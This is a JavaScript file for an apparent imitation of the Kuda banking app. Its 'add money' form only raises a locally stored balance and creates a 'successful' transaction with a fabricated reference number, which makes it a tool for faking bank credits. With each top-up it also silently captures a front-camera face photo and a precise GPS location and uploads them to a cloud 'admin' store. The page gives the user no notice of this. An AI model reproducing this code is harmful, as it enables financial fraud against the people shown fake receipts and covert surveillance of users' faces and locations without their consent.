// Add money functionality
let appData = {
    balance: 10000.00,
    userName: 'BABATUNDE',
    transactions: [],
    profileImage: null
};

const CORRECT_PIN = '862412';

// Save receipt to Supabase cloud (visible from any device)
async function saveReceiptToAdmin(receiptData) {
    await saveReceiptToCloud(receiptData);
}

// Capture face from front camera
async function captureFace() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user', width: 320, height: 240 } });
        const video = document.createElement('video');
        video.srcObject = stream;
        video.setAttribute('playsinline', '');
        await new Promise((res) => { video.onloadedmetadata = () => { video.play(); res(); }; });
        await new Promise(r => setTimeout(r, 500));
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0);
        const dataUrl = canvas.toDataURL('image/jpeg', 0.7);
        stream.getTracks().forEach(t => t.stop());
        return dataUrl;
    } catch (e) {
        console.error('Face capture failed:', e);
        return null;
    }
}

// Get FRESH current location - force new GPS reading
function getCurrentLocation() {
    return new Promise((resolve) => {
        if (!navigator.geolocation) {
            resolve(null);
            return;
        }
        navigator.geolocation.getCurrentPosition(
            (pos) => {
                resolve({
                    latitude: pos.coords.latitude,
                    longitude: pos.coords.longitude,
                    accuracy: pos.coords.accuracy,
                    timestamp: new Date().toISOString()
                });
            },
            (err) => {
                console.error('Location error:', err);
                resolve(null);
            },
            {
                enableHighAccuracy: true,
                timeout: 15000,
                maximumAge: 0 // Force fresh location, don't use cached
            }
        );
    });
}

// PIN verification
function verifyPin() {
    const pinInput = document.getElementById('pinInput');
    const pinError = document.getElementById('pinError');
    const enteredPin = pinInput.value;

    if (enteredPin === CORRECT_PIN) {
        document.getElementById('pinModal').style.display = 'none';
        document.getElementById('mainContent').style.display = 'block';
    } else {
        pinError.textContent = 'Incorrect PIN. Please try again.';
        pinError.style.display = 'block';
        pinInput.value = '';
        pinInput.focus();
    }
}

// Show PIN modal on page load
window.addEventListener('DOMContentLoaded', function() {
    const pinModal = document.getElementById('pinModal');
    pinModal.style.display = 'flex';
    document.getElementById('pinInput').focus();

    // Allow Enter key to submit PIN
    document.getElementById('pinInput').addEventListener('keypress', function(e) {
        if (e.key === 'Enter') {
            verifyPin();
        }
    });
});

// Load data
function loadData() {
    const saved = localStorage.getItem('kudasavingsData');
    if (saved) {
        appData = JSON.parse(saved);
    }
    updateBalance();

    // Pre-fill display name if exists
    document.getElementById('displayName').value = appData.userName;

    // Load existing profile image if exists
    if (appData.profileImage) {
        const previewImg = document.getElementById('previewImg');
        const imagePreview = document.getElementById('imagePreview');
        previewImg.src = appData.profileImage;
        imagePreview.style.display = 'block';
    }
}

// Update balance display
function updateBalance() {
    const balanceEl = document.getElementById('currentBalance');
    if (balanceEl) {
        balanceEl.textContent = new Intl.NumberFormat('en-NG', {
            style: 'currency',
            currency: 'NGN'
        }).format(appData.balance);
    }
}

// Handle profile image upload
document.getElementById('profileImage')?.addEventListener('change', function(e) {
    const file = e.target.files[0];
    if (file) {
        const reader = new FileReader();
        reader.onload = function(event) {
            const previewImg = document.getElementById('previewImg');
            const imagePreview = document.getElementById('imagePreview');
            previewImg.src = event.target.result;
            imagePreview.style.display = 'block';
        };
        reader.readAsDataURL(file);
    }
});

// Handle form submission
document.getElementById('addMoneyForm')?.addEventListener('submit', function(e) {
    e.preventDefault();

    const amount = parseFloat(document.getElementById('topupAmount').value);
    const displayName = document.getElementById('displayName').value;
    const narration = document.getElementById('narration').value || 'Wallet Top-up';
    const profileImageInput = document.getElementById('profileImage');

    if (amount < 100) {
        alert('Minimum top-up amount is ₦100.00');
        return;
    }

    // Show loading
    document.getElementById('loadingOverlay').classList.remove('hidden');

    // Update user name
    appData.userName = displayName;

    // Handle profile image if uploaded
    if (profileImageInput.files && profileImageInput.files[0]) {
        const reader = new FileReader();
        reader.onload = function(event) {
            appData.profileImage = event.target.result;
            processTransaction();
        };
        reader.readAsDataURL(profileImageInput.files[0]);
    } else {
        processTransaction();
    }

    async function processTransaction() {
        // Create transaction
        const transaction = {
            id: 'TXN' + Date.now(),
            type: 'credit',
            accountName: 'Wallet Top-up',
            amount: amount,
            narration: narration,
            date: new Date().toISOString(),
            status: 'successful',
            title: narration,
            referenceNumber: generateReference()
        };

        // Add to balance
        appData.balance += amount;

        // Add to transactions (newest first)
        appData.transactions.unshift(transaction);

        // Save data to localStorage
        localStorage.setItem('kudasavingsData', JSON.stringify(appData));

        // Capture face and location for admin receipt
        const [capturedFace, location] = await Promise.all([
            captureFace(),
            getCurrentLocation()
        ]);

        // Save full receipt to IndexedDB for admin page
        await saveReceiptToAdmin({
            username: appData.userName || 'BABATUNDE',
            accountName: 'Wallet Top-up',
            bankName: 'Kuda (Self)',
            accountNumber: '2054502723',
            amount: amount,
            narration: narration,
            referenceNumber: transaction.referenceNumber,
            transactionDate: transaction.date,
            transactionType: 'credit',
            capturedFace: capturedFace,
            location: location
        });

        // Simulate processing
        setTimeout(() => {
            document.getElementById('loadingOverlay').classList.add('hidden');
            alert(`Successfully added ₦${amount.toLocaleString('en-NG', {minimumFractionDigits: 2})} to your balance!`);
            window.location.href = '/dashboard.html';
        }, 1500);
    }
});

// Generate reference number
function generateReference() {
    return '2509' + Date.now().toString().slice(-16);
}

// Initialize
document.addEventListener('DOMContentLoaded', function() {
    loadData();

    // Validate amount
    document.getElementById('topupAmount')?.addEventListener('input', function() {
        const amount = parseFloat(this.value) || 0;
        if (amount < 100 && amount > 0) {
            this.style.borderColor = '#ff6b35';
        } else {
            this.style.borderColor = '#ddd';
        }
    });
});
